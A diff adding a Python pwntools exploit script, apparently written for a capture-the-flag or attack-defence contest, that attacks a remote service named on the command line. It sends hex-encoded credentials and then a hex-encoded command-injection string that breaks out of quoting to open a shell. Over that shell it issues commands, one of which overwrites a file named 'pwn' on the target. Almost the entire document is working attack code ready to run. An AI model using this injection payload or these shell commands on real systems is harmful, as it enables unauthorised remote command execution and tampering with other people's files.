@@ -1,0 +1,85 @@
+#!/usr/bin/env python2
+#-*- coding:utf-8 -*-
+# Author: i0gan
+from pwn import *
+import os
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+#context.arch = 'amd64'
+
+elf_path  = 'pwn'
+libc_path = '/glibc/2.23/64/lib/libc.so.6'
+libc_path = './libc.so.6'
+
+# remote server ip and port
+#host = "10.1.137.8:9999"
+host = sys.argv[1]
+
+# if local debug
+LOCAL = 0
+LIBC  = 0
+#--------------------------func-----------------------------
+def db():
+    if(LOCAL):
+        gdb.attach(io)
+
+def write_to_flags(d):
+    fd = open('./flags', 'ab')
+    fd.write(d)
+    fd.close()
+
+def write_to_logs(d):
+    fd = open('./logs', 'ab')
+    fd.write(d)
+    fd.close()
+
+#--------------------------exploit--------------------------
+def exploit():
+    li('exploit...')
+    p = "\x31\x36\x38\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+    sa('password:', p)
+
+    p = "\x61\x64\x6d\x69\x6e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+    sa('name:', p)
+
+    p = "\x27\x22\x3b\x73\x68\x3b\x22\x27\x0a"
+    sa(':', p)
+
+    sl('cd /pwn')
+    sl('sh')
+    sl('echo "flag" > pwn ')
+    #sl('echo "flag" > pwn')
+
+def finish():
+    ia()
+    c()
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+    if LOCAL:
+        elf = ELF(elf_path)
+        if LIBC:
+            libc = ELF(libc_path)
+        io = elf.process()
+    else:
+        elf = ELF(elf_path)
+        io = remote(host.split(':')[0], int(host.split(':')[1]))
+        if LIBC:
+            libc = ELF(libc_path)
+    exploit()
+    finish()
